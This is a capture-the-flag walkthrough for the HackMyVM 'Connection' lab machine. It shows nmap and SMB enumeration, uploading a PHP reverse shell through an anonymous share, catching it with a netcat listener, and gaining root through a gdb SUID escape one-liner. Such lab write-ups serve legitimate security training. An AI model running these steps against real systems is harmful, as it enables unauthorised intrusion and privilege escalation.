### Write up for https://hackmyvm.eu/machines/machine.php?vm=Connection ###

## Walkthrough



```bash
ip=<machine's ip>
```

```bash
nmap -v -T4 -p- -sC -sV -oN nmap.log $ip;clear;cat nmap.log
```

```bash
firefox $ip &
```

```bash
enum4linux -a $ip
```


 ======================================== 
```text
|    Share Enumeration on $ip    |
 ======================================== 
```

        Sharename       Type      Comment
```text
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
SMB1 disabled -- no workgroup available
```

[+] Attempting to map shares on $ip
```bash
$ip/share     Mapping: OK, Listing: OK
$ip/print$    Mapping: DENIED, Listing: N/A
$ip/IPC$      [E] Can't understand response:
```
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*


```bash
smbclient //$ip/share
```
login anonymously 

```bash
ls
cd html
```

we can upload a reverse shell 

you can get help with revshells from here wwww.revshells.com

on a new terminal (pico shell.php) paste code from revshells.com

back on the smb
put shell.php
exit

```bash
nc -nlvp 2234
```

```bash
wget $ip/shell.php
```

get Better shell envirorment 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty -a
```

```bash
stty raw -echo;fg
```

```bash
export SHELL=bash
export TERM=xterm
stty rows (values from stty -a) cols (values from stty -a)
```


```bash
find / -perm -u=s 2>/dev/null
```

Visit gtfobins

gdb -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit

id
```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```


```bash
cat /root/proof.txt
cat /home/connection/local.txt
```
